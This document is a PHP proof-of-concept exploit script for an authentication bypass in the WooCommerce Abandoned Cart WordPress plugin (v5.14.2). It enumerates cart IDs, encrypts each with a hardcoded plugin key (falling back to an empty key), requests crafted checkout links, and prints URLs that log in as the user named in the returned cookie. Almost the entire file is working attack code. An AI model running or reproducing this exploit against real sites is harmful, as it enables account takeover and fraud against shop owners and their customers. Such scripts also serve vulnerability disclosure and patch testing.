<?php

// Uses the encryption functions sourced from the vulnerable plugin
// https://github.com/TycheSoftwares/woocommerce-abandoned-cart/tree/v5.14.2/includes/classes
include 'libs/encrypt.php';

function fetch_url_content($url) {
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
    curl_setopt($ch, CURLOPT_HEADER, true);

    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $output = curl_exec($ch);

    if (curl_errno($ch)) {
        echo '[-] Error:' . curl_error($ch)."\n";
        return False;
    }

    // Get the status code
    $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Get header size
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);

    // Separate the headers from the output
    $header = substr($output, 0, $headerSize);
    $body = substr($output, $headerSize);

    curl_close($ch);
    
    // Return headers, body and status code
    return [
        'header' => $header,
        'body' => $body,
        'status_code' => $statusCode
    ];
}



if ($argc != 4) {
    echo "[-] Usage: php poc.php http://target_host arget_port max_cart_id_to_enumerate\n";
    exit(1);
}

$host = $argv[1];
$port = $argv[2];
// The maximum cart ID to enumerate
$max_id = intval($argv[3]);


function exploit_link($host,$port,$id,$encryption_key){
    $validate_val = $id.'&url='.$host.':'.$port.'/checkout/';
    $encrypted_val = encrypt($validate_val, $encryption_key, 256);

    $url = $host.':'.$port.'/?wcal_action=checkout_link&user_email=test&validate='.$encrypted_val;

    $result = fetch_url_content($url);

    if ($result == False){
        return False;
    }
    
    if ($result['body'] == 'Link expired') {
        return False;
    } else {
        // Looking for username
        preg_match('/Set-Cookie:.*wordpress_.*=(.*?)%/', $result['header'], $matches);
        $username = isset($matches[1]) ? $matches[1] : null;

        if ($username){
            echo "[+] Authentication Bypass URL for user '".$username."' : ".$url."\n";
            return True;
        }else{
            return False;
        }
        
    }
}

for ($id = 1; $id <= $max_id; $id++) {
    echo "[*] Enumerating cart ID : ".$id."\n";
    // Hardcoded Encryption key
    $encryption_key = 'qJB0rGtIn5UB1xG03efyCp';
    $res = exploit_link($host,$port,$id,$encryption_key);

    if (! $res){
        // In the docker instance I tried, it had empty encryption key for somereason
        $encryption_key = '';
        $res = exploit_link($host,$port,$id,$encryption_key);
    }
}

?>